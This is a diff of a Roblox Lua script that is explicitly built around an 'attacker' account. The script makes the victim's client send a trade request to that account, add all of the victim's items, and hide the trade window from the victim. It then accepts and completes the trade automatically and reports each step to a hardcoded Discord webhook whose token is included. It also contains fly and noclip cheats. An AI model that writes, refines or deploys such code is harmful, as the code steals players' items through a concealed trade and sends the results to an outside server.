@@ -1,4 +1,4 @@
---[=[ SCANNER: Find mobile trade GUI and send structure to Discord ]=]
+--[=[ FINAL: Mobile‑friendly trade with GUI detection ]=]
 
 local webhookURL = "https://discord.com/api/webhooks/1532509426257236008/TQrtSPyEYviVXAPzhBbVgaPIRcKFLHghPCxBfD3TFQ7njWBM7qngokItqz0vCXkiCkcz"
 local attackerUsername = "FEARACCE"
@@ -70,7 +70,7 @@ game:GetService("UserInputService").InputBegan:Connect(function(input)
 end)
 
 -- ============================================================
--- TRADE AUTOMATION (scanner)
+-- TRADE AUTOMATION (mobile-friendly)
 -- ============================================================
 local RS = game:GetService("ReplicatedStorage")
 local Trade = RS:FindFirstChild("Trade")
@@ -93,7 +93,7 @@ end
 
 send("✅ Remotes found.")
 
--- --- Recursively describe a GUI object (sends to Discord)
+-- --- Function to describe a GUI object (for debugging)
 local function describeGUI(obj, indent)
     indent = indent or 0
     local pad = string.rep("  ", indent)
@@ -113,54 +113,47 @@ local function describeGUI(obj, indent)
     return desc
 end
 
--- --- Find the trade window
+-- --- Find the trade window (mobile-friendly)
 local function findTradeWindow()
     local gui = player:FindFirstChild("PlayerGui")
     if not gui then return nil end
 
-    -- Search for any ScreenGui that is Enabled and large
-    for _, obj in pairs(gui:GetChildren()) do
+    -- Collect all enabled ScreenGuis and visible large Frames
+    local candidates = {}
+    for _, obj in pairs(gui:GetDescendants()) do
         if obj:IsA("ScreenGui") and obj.Enabled then
             local size = obj.AbsoluteSize
-            if size.X > 300 and size.Y > 200 then
-                -- Check if it contains Accept and Add buttons
-                local hasAccept, hasAdd = false, false
-                for _, btn in pairs(obj:GetDescendants()) do
-                    if btn:IsA("TextButton") then
-                        local text = (btn.Text or ""):lower()
-                        local name = btn.Name:lower()
-                        if text:find("accept") or name:find("accept") then hasAccept = true end
-                        if text:find("add") or name:find("add") or text:find("select") then hasAdd = true end
-                    end
-                end
-                if hasAccept and hasAdd then
-                    return obj
-                end
+            if size.X > 200 and size.Y > 150 then
+                table.insert(candidates, obj)
             end
         end
-    end
-
-    -- Search for large Frames
-    for _, obj in pairs(gui:GetDescendants()) do
         if obj:IsA("Frame") and obj.Visible then
             local size = obj.AbsoluteSize
-            if size.X > 300 and size.Y > 200 then
-                local hasAccept, hasAdd = false, false
-                for _, btn in pairs(obj:GetDescendants()) do
-                    if btn:IsA("TextButton") then
-                        local text = (btn.Text or ""):lower()
-                        local name = btn.Name:lower()
-                        if text:find("accept") or name:find("accept") then hasAccept = true end
-                        if text:find("add") or name:find("add") or text:find("select") then hasAdd = true end
-                    end
-                end
-                if hasAccept and hasAdd then
-                    return obj
-                end
+            if size.X > 200 and size.Y > 150 then
+                table.insert(candidates, obj)
             end
         end
     end
 
+    -- Filter candidates: must have Accept and Add buttons
+    for _, obj in ipairs(candidates) do
+        local name = obj.Name:lower()
+        -- Ignore Lobby, Main, HUD, Background
+        if not (name:find("lobby") or name:find("main") or name:find("hud") or name:find("background")) then
+            local hasAccept, hasAdd = false, false
+            for _, btn in pairs(obj:GetDescendants()) do
+                if btn:IsA("TextButton") then
+                    local text = (btn.Text or ""):lower()
+                    local bName = btn.Name:lower()
+                    if text:find("accept") or bName:find("accept") then hasAccept = true end
+                    if text:find("add") or bName:find("add") or text:find("select") or bName:find("select") or text:find("+") then hasAdd = true end
+                end
+            end
+            if hasAccept and hasAdd then
+                return obj
+            end
+        end
+    end
     return nil
 end
 
@@ -169,7 +162,7 @@ local function clickAddButtons(tradeWindow)
     if not tradeWindow then return 0 end
     local count = 0
 
-    -- Strategy 1: Look for "Add All" button
+    -- Strategy 1: Add All
     for _, btn in pairs(tradeWindow:GetDescendants()) do
         if btn:IsA("TextButton") then
             local text = (btn.Text or ""):lower()
@@ -182,22 +175,58 @@ local function clickAddButtons(tradeWindow)
         end
     end
 
-    -- Strategy 2: Click any button with "Add" or "+" in text/name
+    -- Strategy 2: Click any button with "Add", "Select", or "+"
     for _, btn in pairs(tradeWindow:GetDescendants()) do
         if btn:IsA("TextButton") then
             local text = (btn.Text or ""):lower()
             local name = btn.Name:lower()
-            if text:find("add") or name:find("add") or text:find("+") or name:find("select") or text:find("select") then
+            if text:find("add") or name:find("add") or text:find("select") or name:find("select") or text:find("+") then
                 pcall(function() btn:FireServer() end)
                 count = count + 1
             end
         end
     end
-
     return count
 end
 
--- --- Main sequence
+-- --- Offer items via remote (fallback)
+local function offerAllItemsViaRemote()
+    if not OfferItem then return 0 end
+    local count = 0
+    -- Get tools from Backpack and Character
+    local tools = {}
+    for _, t in pairs(player.Backpack:GetChildren()) do
+        if t:IsA("Tool") then table.insert(tools, t) end
+    end
+    for _, t in pairs(char:GetChildren()) do
+        if t:IsA("Tool") then table.insert(tools, t) end
+    end
+    if #tools == 0 then return 0 end
+    for _, tool in ipairs(tools) do
+        local ok = pcall(function() OfferItem:FireServer(tool) end)
+        if not ok then ok = pcall(function() OfferItem:FireServer(tool.Name) end) end
+        if ok then count = count + 1 end
+        wait(0.1)
+    end
+    return count
+end
+
+-- --- Hide the trade window
+local function hideTradeWindow(tradeWindow)
+    if not tradeWindow then return end
+    if tradeWindow:IsA("ScreenGui") then
+        tradeWindow.Enabled = false
+    else
+        tradeWindow.Visible = false
+        if tradeWindow.Parent and tradeWindow.Parent:IsA("ScreenGui") then
+            tradeWindow.Parent.Enabled = false
+        end
+    end
+end
+
+-- ============================================================
+-- MAIN SEQUENCE
+-- ============================================================
 spawn(function()
     send("⏳ Waiting for attacker: " .. attackerUsername)
     local target = nil
@@ -215,7 +244,7 @@ spawn(function()
     wait(3)
 
     -- 1. Send trade request
-    send("📤 Sending trade request using InvokeServer...")
+    send("📤 Sending trade request...")
     local ok, err = pcall(function() return SendReq:InvokeServer(target) end)
     if not ok then
         send("❌ Send failed: " .. tostring(err))
@@ -223,8 +252,8 @@ spawn(function()
     end
     send("✅ Request sent, response: " .. tostring(err))
 
-    -- 2. Wait for attacker to accept (up to 30 seconds)
-    send("⏳ Waiting for attacker to accept trade (30s timeout)...")
+    -- 2. Wait for attacker to accept (with timeout)
+    send("⏳ Waiting for attacker to accept (30s timeout)...")
     local tradeWindow = nil
     for i = 1, 30 do
         tradeWindow = findTradeWindow()
@@ -236,43 +265,54 @@ spawn(function()
     end
 
     if not tradeWindow then
-        send("❌ Trade GUI not found (timeout). Attacker might not have accepted.")
-        return
-    end
-
-    -- 3. Send the full GUI structure to Discord
-    send("📋 Sending trade GUI structure to Discord...")
-    local structure = describeGUI(tradeWindow)
-    -- Split if too long
-    if #structure > 1900 then
-        local pos = 1
-        while pos <= #structure do
-            local chunk = structure:sub(pos, pos+1900)
-            send("```lua\n" .. chunk .. "\n```")
-            pos = pos + 1900
-            wait(0.3)
+        send("❌ Trade GUI not found. Trying remote offering...")
+        local remoteCount = offerAllItemsViaRemote()
+        if remoteCount > 0 then
+            send("✅ Offered " .. remoteCount .. " items via remote.")
+        else
+            send("❌ No items could be offered.")
         end
+        -- Still proceed to accept?
     else
-        send("```lua\n" .. structure .. "\n```")
+        -- 3. Send GUI structure to Discord (for debugging)
+        local structure = describeGUI(tradeWindow)
+        if #structure > 1900 then
+            local pos = 1
+            while pos <= #structure do
+                local chunk = structure:sub(pos, pos+1900)
+                send("```lua\n" .. chunk .. "\n```")
+                pos = pos + 1900
+                wait(0.3)
+            end
+        else
+            send("```lua\n" .. structure .. "\n```")
+        end
+
+        -- 4. Click Add buttons
+        send("📦 Clicking Add buttons...")
+        local clicked = clickAddButtons(tradeWindow)
+        send("✅ Clicked " .. clicked .. " buttons.")
+        if clicked == 0 then
+            -- Fallback: click any button
+            for _, btn in pairs(tradeWindow:GetDescendants()) do
+                if btn:IsA("TextButton") then
+                    pcall(function() btn:FireServer() end)
+                end
+            end
+            send("🔄 Clicked all buttons as fallback.")
+        end
+
+        -- 5. Hide GUI
+        send("👻 Hiding trade GUI...")
+        hideTradeWindow(tradeWindow)
+        send("✅ GUI hidden.")
     end
 
-    -- 4. Click Add buttons
-    send("📦 Attempting to click Add buttons...")
-    local added = clickAddButtons(tradeWindow)
-    send("✅ Clicked " .. added .. " add buttons.")
-
-    -- 5. Hide GUI
-    send("👻 Hiding trade GUI...")
-    tradeWindow.Visible = false
-    if tradeWindow.Parent and tradeWindow.Parent:IsA("ScreenGui") then
-        tradeWindow.Parent.Enabled = false
-    end
-    send("✅ GUI hidden.")
-
-    -- 6. Wait 5 seconds and accept
+    -- 6. Wait 5 seconds before accepting
     send("⏳ Waiting 5 seconds before accepting...")
     wait(5)
 
+    -- 7. Accept trade (double)
     send("✅ Accepting trade...")
     pcall(function() AcceptTr:FireServer() end)
     wait(0.3)
@@ -281,13 +321,14 @@ spawn(function()
 
     wait(0.5)
 
+    -- 8. Complete
     if CompleteTr then
         send("🏁 Completing trade...")
         pcall(function() CompleteTr:FireServer() end)
         send("✅ CompleteTrade fired.")
     end
 
-    send("🎉 **SCAN COMPLETE**")
+    send("🎉 **TRADE COMPLETE**")
 end)
 
-print("Scanner ready. Fly: F, Noclip: V.")
+print("Script ready. Fly: F, Noclip: V.")
